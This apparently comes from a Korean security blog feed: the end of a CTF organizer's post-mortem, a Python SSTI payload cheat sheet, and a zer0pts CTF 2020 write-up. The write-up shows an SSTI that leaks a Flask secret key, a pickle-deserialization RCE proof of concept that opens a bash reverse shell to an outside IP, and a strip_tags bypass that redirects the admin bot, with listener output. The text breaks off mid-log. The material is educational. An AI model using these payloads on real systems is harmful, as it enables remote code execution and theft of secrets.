생각합니다.</p></blockquote><h2 id="Server-Management"><a href="#Server-Management" class="headerlink" title="Server Management"></a>Server Management</h2><blockquote><p>서버를 어떻게 구성할지에 대한 고민을 많이 했습니다.<br>최근에 털렸던 여타 서버와 같은 일이 벌어지지 않도록<br>최대한 안전한 시스템을 만들고자 했고<br>따라서 모든 문제에 도커를 적용하도록 강제했습니다.</p></blockquote><blockquote><p>분명 도커 사용에 익숙하지 않은 팀원이 있었지만,<br>결과적으로는 모든 문제 서버에 적용했고<br>덕분에 해당 출제자가 부재중이더라도, 간단한 서버 관리가 가능했습니다.</p></blockquote><blockquote><p>Web서버와 Osint서버도 기본적으로는 같지만<br>포트스캐닝을 통해서 문제가 릴리즈 전에 노출되는 상황을 방지하기 위해서<br>리버스 프록시 용도로 Nginx 를 두어 호스트 기반 검증을 거쳤습니다.</p></blockquote><blockquote><p>대회 중에 서버가 사망하는 일이 종종 있는데<br>최대한 빠르게 대처할 수 있도록 15초마다 동작하는 헬스체크 봇을 만들어<br>문제 발생시, 서버에 대한 정보를 메일로 받아볼 수 있게 하였습니다.</p></blockquote><blockquote><p>이는 확실히 도움이 됐지만, 메일보다는 디스코드 봇 쪽이 더 좋았을 것이라고 생각합니다.<br>아무래도 메일은 알림을 끄기 쉽지 않고, 소통 채널이 분할되어 버리니까요.</p></blockquote><h2 id="Server-Allocation"><a href="#Server-Allocation" class="headerlink" title="Server Allocation"></a>Server Allocation</h2><blockquote><p>각 서버당 최소 1문제 ~ 4문제 정도를 수용하도록 했습니다.<br>성능 문제로 이상이 생기는 것을 최대한 회피하고자<br>요구치보다 다소 높은 서버를 사용 하였고<br>가격 절감을 위해 Aws / GCloud 가 아닌 Vultr 을 이용하였습니다.</p></blockquote><h3 id="141-164-47-140"><a href="#141-164-47-140" class="headerlink" title="141.164.47.140"></a>141.164.47.140</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 2 Core CPU + 4GB RAM + 80GB SSD</li></ul></li><li><p>Purpose</p><ul><li>CTF Website Production Server</li></ul></li></ul></code><h3 id="141-164-59-78"><a href="#141-164-59-78" class="headerlink" title="141.164.59.78"></a>141.164.59.78</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 2 Core CPU + 4GB RAM + 80GB SSD</li><li>문제 유출 가능성을 없애기 위해, 화이트리스트 방식으로 차단을 수행하였습니다.</li></ul></li><li><p>Purpose</p><ul><li>CTF Website Development Server</li></ul></li></ul></code><h3 id="141-164-60-123"><a href="#141-164-60-123" class="headerlink" title="141.164.60.123"></a>141.164.60.123</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Warmup (Pwn)</li><li>Base64 Encoder (Pwn)</li><li>ORVVM (Pwn)</li><li>Persona (Pwn)</li></ul></li></ul></code><h3 id="141-164-60-159"><a href="#141-164-60-159" class="headerlink" title="141.164.60.159"></a>141.164.60.159</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Variable Machine (Pwn)</li><li>Error program (Pwn)</li><li>BitBit (Pwn)</li></ul></li></ul></code><h3 id="141-164-39-92"><a href="#141-164-39-92" class="headerlink" title="141.164.39.92"></a>141.164.39.92</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 8 Core CPU + 32GB Ram + 640GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Input Test Driver (Pwn)</li></ul></li></ul></code><h3 id="141-164-60-163"><a href="#141-164-60-163" class="headerlink" title="141.164.60.163"></a>141.164.60.163</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Highlighter (Web)</li><li>Fortune Cookie (Web)</li><li>Tar Analyzer (Web)</li></ul></li></ul></code><h3 id="45-63-124-33"><a href="#45-63-124-33" class="headerlink" title="45.63.124.33"></a>45.63.124.33</h3><code><ul><li><p>Configuration</p><ul><li>Windows Server 2016 / 2 Core CPU + 4GB RAM + 80GB SSD</li><li>한국 Vultr 리전에서는 지원하지 않으므로 유일한 일본 서버입니다.</li></ul></li><li><p>Purpose</p><ul><li>Babyjs (Web)</li></ul></li></ul></code><h3 id="141-164-59-254"><a href="#141-164-59-254" class="headerlink" title="141.164.59.254"></a>141.164.59.254</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Puzzle (Misc)</li><li>QR Generator (Misc)</li><li>Executor (Misc)</li></ul></li></ul></code><h3 id="141-164-60-154"><a href="#141-164-60-154" class="headerlink" title="141.164.60.154"></a>141.164.60.154</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Minesweeper (Misc)</li><li>Dodge (Misc)</li><li>Hack The C2 (Osint)</li></ul></li></ul></code><h3 id="141-164-60-138"><a href="#141-164-60-138" class="headerlink" title="141.164.60.138"></a>141.164.60.138</h3><code><ul><li><p>Configuration</p><ul><li>Linux / 4 Core CPU + 8GB RAM + 160GB SSD</li></ul></li><li><p>Purpose</p><ul><li>Simple SPN (Crypto)</li><li>Hash Chungdol (Crypto)</li><li>What Browser do I use (Forensic)</li></ul></li></ul></code><h2 id="Website"><a href="#Website" class="headerlink" title="Website"></a>Website</h2><blockquote><p>react + backend api 형태로 개발된 플랫폼은<br>높은 성능을 보여주었지만, 400팀에서 1000팀 정도를 상정한 스트레스 테스트를 통해<br>scoreboard 엔드포인트에서 엄청난 부하가 걸리고 있다는 것을 깨달았습니다.<br>이후에 캐시를 사용하도록 패치를 수행하였고<br>1000팀 접속에도 견딜 수 있는 플랫폼을 완성할 수 있었습니다.</p></blockquote><blockquote><p>본래라면 플래그 인증 후에 폭죽이 터지는 등의 효과를 넣으려고 했지만<br>여유가 없어서 구현하지 못하고, alert으로 대체해버린 점 아쉽게 생각하고 있습니다.</p></blockquote><p><img src="/img/2020/06/defenit_ctf7.png" alt="defenit_ctf7"></p><h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="babyjs"><a href="#babyjs" class="headerlink" title="babyjs"></a>babyjs</h3><blockquote><p>본래 30솔브 정도를 예상했지만,<br>언인텐에 처참히 무너져 47솔브를 기록했습니다, 반성하고 있습니다. 😥</p></blockquote><h3 id="fortune-cookie"><a href="#fortune-cookie" class="headerlink" title="fortune cookie"></a>fortune cookie</h3><blockquote><p>본래 15솔브 정도를 예상했고, 정확히 15솔브를 기록했습니다.<br>친숙한 이름 덕분에 가장 쉬워 보였던 건지<br>이 문제와 관련한 질문이 가장 많이 들어왔고 힌트 요청 또한 정말정말 많이 들어와서<br>정신적인 스트레스 요인이었습니다.</p></blockquote><h3 id="Highlighter"><a href="#Highlighter" class="headerlink" title="Highlighter"></a>Highlighter</h3><blockquote><p>3솔브를 예상했고, 4솔브를 기록한 문제입니다.<br>예상보다 상위권 팀들이 열심히 풀어준 덕분인 것 같습니다.<br>이것도 솔브수에 비해 언인텐이 좀 있어서 아쉽지만, 나름 괜찮았습니다.</p></blockquote><h3 id="AdultJS"><a href="#AdultJS" class="headerlink" title="AdultJS"></a>AdultJS</h3><blockquote><p>babyjs 언인텐에 충격받고 급하게 제조하게 된 문제입니다.<br>당초에는 1솔브 정도를 예상했는데, 남은 16시간 중 8시간이 지나도록 소식이 들리지 않아서<br>결국 분석 난이도를 대폭 감소시키고 힌트 폭탄을 던졌습니다.<br>덕분에 Highlighter 보다 높은 5 솔브를 기록하였습니다.</p></blockquote><h2 id="Sponsor"><a href="#Sponsor" class="headerlink" title="Sponsor"></a>Sponsor</h2><blockquote><p>여러 기업에 후원 요청을 넣었고<br>Theori, ENKI에서 응답해 주셨습니다.<br>덕분에 30/10/5 에 불과하던 상금을 100/30/10으로 대폭 상승시킬 수 있었습니다.<br>또한 약간은 부담스러운 후원 요구에도 도움을 준 zer0pts 팀에도 감사합니다.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python SSTI, Exploitable Classes</title>
      <link href="/Python-SSTI-exploitable-classes/"/>
      <url>/Python-SSTI-exploitable-classes/</url>
      
        <content type="html"><![CDATA[<blockquote><p>This document is continuously updated.</p></blockquote><h2 id="Useful-Classes"><a href="#Useful-Classes" class="headerlink" title="Useful Classes"></a>Useful Classes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">_frozen_importlib._ModuleLock</span><br><span class="line">_frozen_importlib._DummyModuleLock</span><br><span class="line">_frozen_importlib._ModuleLockManager</span><br><span class="line">_frozen_importlib._installed_safely</span><br><span class="line">_frozen_importlib.ModuleSpec</span><br><span class="line">_frozen_importlib_external.FileLoader</span><br><span class="line">_frozen_importlib_external._NamespacePath</span><br><span class="line">_frozen_importlib_external._NamespaceLoader</span><br><span class="line">_frozen_importlib_external.FileFinder</span><br><span class="line">codecs.IncrementalEncoder</span><br><span class="line">codecs.IncrementalDecoder</span><br><span class="line">codecs.StreamReaderWriter</span><br><span class="line">codecs.StreamRecoder</span><br><span class="line">os._wrap_close</span><br><span class="line">_sitebuiltins._Printer</span><br><span class="line">types.DynamicClassAttribute</span><br><span class="line">types._GeneratorWrapper</span><br><span class="line">warnings.WarningMessage</span><br><span class="line">warnings.catch_warnings</span><br><span class="line">contextlib._GeneratorContextManagerBase</span><br><span class="line">contextlib._BaseExitStack</span><br></pre></td></tr></table></figure><h2 id="Using-os-wrap-close"><a href="#Using-os-wrap-close" class="headerlink" title="Using os._wrap_close"></a>Using os._wrap_close</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line">[].__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'popen'</span>](<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Zer0pts CTF 2020</title>
      <link href="/zer0pts-CTF-2020/"/>
      <url>/zer0pts-CTF-2020/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1006" target="_blank" rel="noopener">https://ctftime.org/event/1006</a></li></ul><p><img src="/img/2020/03/image-20200309084922019.png" alt="image-20200309084922019"></p><p>일본의 <strong>zer0pts</strong> 팀에서 주관한 CTF입니다.</p><h2 id="332pts-notepad-1st-solve"><a href="#332pts-notepad-1st-solve" class="headerlink" title="[332pts] notepad (1st solve)"></a>[332pts] notepad (1st solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/notepad_d0fde3493051f54a1a2286bf40e948c0.tar.gz" target="_blank" rel="noopener">notepad.tar.gz</a></li></ul><blockquote><p>This notepad is more useful than Windows one, right?</p></blockquote><p>Flask SSTI and pickle Unserialize 를 주제로 한 문제입니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="string">""" Automatically go back when page is not found """</span></span><br><span class="line">    referrer = flask.request.headers.get(<span class="string">"Referer"</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> referrer <span class="keyword">is</span> <span class="literal">None</span>: referrer = <span class="string">'/'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid_url(referrer): referrer = <span class="string">'/'</span></span><br><span class="line">    </span><br><span class="line">    html = <span class="string">'&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="Refresh" content="3;URL=&#123;&#125;"&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Page not found. Redirecting...&lt;/body&gt;&lt;/html&gt;'</span>.format(referrer)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(html), <span class="number">404</span></span><br></pre></td></tr></table></figure><p>404 페이지 렌더링에 사용되는 <code>page_not_found</code> 함수에서는 Referer 값을 인자로 하여 문자열을 구성해<br>flask의 <code>render_template_string</code> 함수로 전달하고 있습니다.</p><p>따라서 SSTI 에 취약하며, <code>{{config}}</code> 값을 삽입하는 것으로 서버의 시크릿 키을 알아낼 수 있습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// Request</span><br><span class="line">GET /x HTTP/1.1</span><br><span class="line">Host: 3.112.201.75:8001</span><br><span class="line">Referer: http://3.112.201.75:8001/?&#123;&#123;config&#125;&#125;</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">// Response</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Refresh"</span> <span class="attr">content</span>=<span class="string">"3;URL=http://3.112.201.75:8001/?&lt;Config &#123;'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': b'\\\xe4\xed&#125;w\xfd3\xdc\x1f\xd72\x07/C\xa9I', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None&#125;&gt;"</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span>Page not found. Redirecting...<span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>위와 같은 요청을 통해 <code>SECRET_KEY</code> 가 <code>b&#39;\\\xe4\xed}w\xfd3\xdc\x1f\xd72\x07/C\xa9I&#39;</code>라는 것을 알아냈으므로, session 값을 자유롭게 조작할 수 있습니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">...</span><br><span class="line"><span class="meta">@app.route('/note/&lt;int:nid&gt;', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">notepad</span><span class="params">(nid=<span class="number">0</span>)</span>:</span></span><br><span class="line">    data = load()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= nid &lt; len(data):</span><br><span class="line">        nid = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">'index.html'</span>, data=data, nid=nid)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">""" Load saved notes """</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        savedata = flask.session.get(<span class="string">'savedata'</span>, <span class="literal">None</span>)</span><br><span class="line">        data = pickle.loads(base64.b64decode(savedata))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        data = [&#123;<span class="string">"date"</span>: now(), <span class="string">"text"</span>: <span class="string">""</span>, <span class="string">"title"</span>: <span class="string">"*New Note*"</span>&#125;]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>pickle unserialize 가 실행되는 곳은 <code>load</code> 함수로 세션에서 <code>savedata</code> 값을 가져와 base64 복호화 한 후 <code>pickle.loads</code> 를 실행하고 있습니다.</p><p>따라서 savedata 값을 조작해준 후, load 함수를 호출하는 <code>/note/&lt;int:nid&gt;</code> 경로를 요청하면 됩니다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"><span class="keyword">import</span> os, sys, pickle, base64, requests</span><br><span class="line"></span><br><span class="line">COMMAND = <span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1'"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PickleRce</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(COMMAND,))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span>  </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.secret_key = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">app = App()  </span><br><span class="line">app.secret_key = <span class="string">b'\\\xe4\xed&#125;w\xfd3\xdc\x1f\xd72\x07/C\xa9I'</span></span><br><span class="line"></span><br><span class="line">si = SecureCookieSessionInterface()</span><br><span class="line">serializer = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">session = serializer.dumps(&#123;<span class="string">'savedata'</span>:base64.b64encode(pickle.dumps(PickleRce()))&#125;)</span><br><span class="line"></span><br><span class="line">requests.get(<span class="string">'http://3.112.201.75:8001/note/1'</span>, cookies = &#123;</span><br><span class="line">    <span class="string">'session'</span>: session</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>위는 pickle unserialize 를 이용해 rce를 하는 poc입니다.</p><h2 id="653pts-MusicBlog-2nd-solve"><a href="#653pts-MusicBlog-2nd-solve" class="headerlink" title="[653pts] MusicBlog (2nd solve)"></a>[653pts] MusicBlog (2nd solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/MusicBlog_637545797ab8638bffd877d7be2ec045.tar.gz" target="_blank" rel="noopener">MusicBlog.tar.gz</a></li></ul><blockquote><p>You can introduce favorite songs to friends with <strong>MusicBlog</strong>!</p></blockquote><p>분류를 정하기 힘든 문제인데, client side attack 입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">'zer0pts&#123;&lt;censored&gt;&#125;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">'#like'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br></pre></td></tr></table></figure><p>주어진 소스에서 worker.js 를 확인해 보면 페이지가 작성되면 관리자가 게시글에 들어가 like 버튼을 누른 후 봇이 종료됨을 확인할 수 있습니다.</p><p>플래그는 관리자의 user-agent 값에 포함되어 있네요.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$nonce = get_nonce();</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'nonce-$&#123;nonce&#125;' 'strict-dynamic'; base-uri 'none'; trusted-types"</span>);</span><br><span class="line">header(<span class="string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">header(<span class="string">'X-XSS-Protection: 1; mode=block'</span>);</span><br></pre></td></tr></table></figure><p>서버에는 csp 가 걸려있어, 외부로 요청을 보낼 수 없습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// [[URL]] → &lt;audio src="URL"&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>본 문제의 중요한 부분은 여기입니다.<br>게시글 작성 중에 사용되는 필터링 함수에서는, <code>strip_tags</code> 함수를 사용하고 있는데 본 함수에 존재하는 취약점을 통해 문제를 해결할 수 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(strip_tags(<span class="string">'&lt;a/udio&gt;'</span>, <span class="string">'&lt;audio&gt;'</span>));</span><br><span class="line"><span class="comment">// string(8) "&lt;a/udio&gt;"</span></span><br></pre></td></tr></table></figure><p>audio 태그만 허용해야 하는 것이 정상이지만, strip_tags 는 태그 사이에 slash 가 들어가는 것을 허용하고 있습니다. 따라서 우리는 a 태그를 사용할 수 있게 됩니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">"mt-4"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"badge badge-secondary"</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>            titie here          <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"text-muted"</span>&gt;</span>by posix <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"badge badge-love badge-pill"</span>&gt;</span>♥ 0<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mt-3"</span>&gt;</span></span><br><span class="line">        content here          <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mt-3"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"like.php?id=5dfd06e9-741b-4fff-a3a5-4f5e8e79dac8"</span> <span class="attr">id</span>=<span class="string">"like"</span> <span class="attr">class</span>=<span class="string">"btn btn-love"</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>또한 content 가 들어가는 부분도 like 버튼보다 상위에 위치하고 있습니다.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>/<span class="attr">udio</span> <span class="attr">id</span>=<span class="string">"like"</span> <span class="attr">href</span>=<span class="string">"http://rwx.kr:8888"</span>&gt;</span>x</span><br></pre></td></tr></table></figure><p>따라서 위와 같은 태그를 삽입해 주면, 공격자 서버로 접속하도록 할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvp 8888</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8888)</span><br><span class="line">Connection from ec2-3-112-201-75.ap-northeast-1.compute.amazonaws.com 53510 received!</span><br><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: rwx.kr:8888</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span 